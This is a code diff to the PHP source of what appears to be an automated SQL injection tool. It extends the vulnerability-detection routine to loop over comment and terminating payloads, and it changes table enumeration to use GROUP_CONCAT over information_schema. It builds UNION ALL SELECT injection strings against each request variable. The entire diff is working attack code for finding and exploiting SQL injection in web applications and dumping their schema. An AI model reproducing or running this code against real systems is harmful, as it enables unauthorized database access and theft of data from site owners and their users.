@@ -14,6 +14,85 @@
 			private $_useConcat					= FALSE;			//Concat values with a tag like <aidsql></aidsql>
 			private $_openTag						= NULL;
 			private $_closeTag					= NULL;
+			private $_terminatingPayloads		= array("LIMIT 1,1", " ORDER BY 1", "LIMIT 1,1 ORDER BY 1");
+			private $_currTerminatingPayload = NULL;
+			private $_commentPayloads			= array("/*","--","#");
+
+			/**
+			*Checkout if the given URL by the HttpAdapter is vulnerable or not
+			*This method combines execution
+			*/
+
+			public function isVulnerable(){
+
+				$vars		= $this->_httpAdapter->getRequestVariables();
+
+				$found	= FALSE;
+
+				$payloads = array(
+									"LIMIT 1,1",
+									"ORDER BY 1"
+				);
+
+				$this->setUseConcat(TRUE);
+
+				foreach($vars as $variable=>$value){
+
+					$this->setAffectedVariable($variable,$value);
+
+					for($i=1;$i<=$this->_injectionAttempts;$i++){
+
+						$this->setMaxFields($i);
+
+						foreach($this->_commentPayloads as $commentPayload){
+
+							$this->setQueryCommentOpen($commentPayload);
+				
+							foreach($this->_terminatingPayloads as $terminatingPayload){
+
+								$this->_currTerminatingPayload = $terminatingPayload;
+
+								$injection	= $this->makeDiscoveryInjection();
+						
+								$this->dEcho("[$variable] Attempt:\t$i");
+
+								$matches = $this->analyzeInjection($injection);
+
+								if(isset($matches[0])){
+
+									$this->dEcho("FOUND SQL INJECTION!!!\n");
+									$this->dEcho("Affected Variable:\t$variable");
+									$this->dEcho("Affected Fields:\t".implode($matches,","));
+
+									$field = $this->pickRandomValue($matches);
+
+									$this->dEcho("Picking field \"$field\" to perform further analysis ...");
+
+									//Actually we can have a series of childNodes here any field is good, so we just pick
+									//a random field.
+
+									$this->setAffectedVariable($variable,$value);
+									$this->setAffectedField($field);
+									$this->setMaxFields($i);
+
+									return TRUE;
+
+								}
+
+							}
+
+						}
+
+					}
+
+					$this->_httpAdapter->addRequestVariable($variable,$value); //restore value if we couldnt find the vulnerable field
+
+				}
+
+				return FALSE;
+
+			}
+
 
 			public function setTotalRegisters($totalRegisters=0){
 
@@ -168,7 +247,7 @@
 
 			public function getTables(){
 
-				$fieldInjection	= "TABLE_NAME";
+				$fieldInjection	= "GROUP_CONCAT(TABLE_NAME)";
 				$tableInjection	= "FROM information_schema.tables WHERE table_schema=DATABASE()";
 
 				return $this->generateInjection($fieldInjection,$tableInjection);
@@ -357,64 +436,6 @@
 			public function getUserPrivileges(){
 			}
 
-			/**
-			*Checkout if the given URL by the HttpAdapter is vulnerable or not
-			*This method combines execution
-			*/
-
-			public function isVulnerable(){
-
-				$vars		= $this->_httpAdapter->getRequestVariables();
-
-				$found	= FALSE;
-
-				foreach($vars as $variable=>$value){
-
-					$this->setAffectedVariable($variable,$value);
-
-					for($i=1;$i<=$this->_injectionAttempts;$i++){
-
-						$this->setUseConcat(TRUE);
-						$this->setMaxFields($i);
-
-						$injection	= $this->makeDiscoveryInjection();
-						
-						$this->dEcho("[$variable] Attempt:\t$i");
-
-						$matches = $this->analyzeInjection($injection);
-
-
-						if(isset($matches[0])){
-
-							$this->dEcho("FOUND SQL INJECTION!!!\n");
-							$this->dEcho("Affected Variable:\t$variable");
-							$this->dEcho("Affected Fields:\t".implode($matches,","));
-
-							$field = $this->pickRandomValue($matches);
-
-							$this->dEcho("Picking field \"$field\" to perform further analysis ...");
-
-							//Actually we can have a series of childNodes here any field is good, so we just pick
-							//a random field.
-
-							$this->setAffectedVariable($variable,$value);
-							$this->setAffectedField($field);
-							$this->setMaxFields($i);
-
-							return TRUE;
-
-						}
-
-
-					}
-
-					$this->_httpAdapter->addRequestVariable($variable,$value); //restore value if we couldnt find the vulnerable field
-
-				}
-
-				return FALSE;
-
-			}
 
 			/**
 			*Combines URL execution with parsing
@@ -436,7 +457,7 @@
 
 				}
 
-				$value		= "$value UNION ALL SELECT $injection LIMIT 1,1";
+				$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
 				$content		= $this->execute($variable,$value);
 
 				$parser		= $this->getParser("tagmatcher");
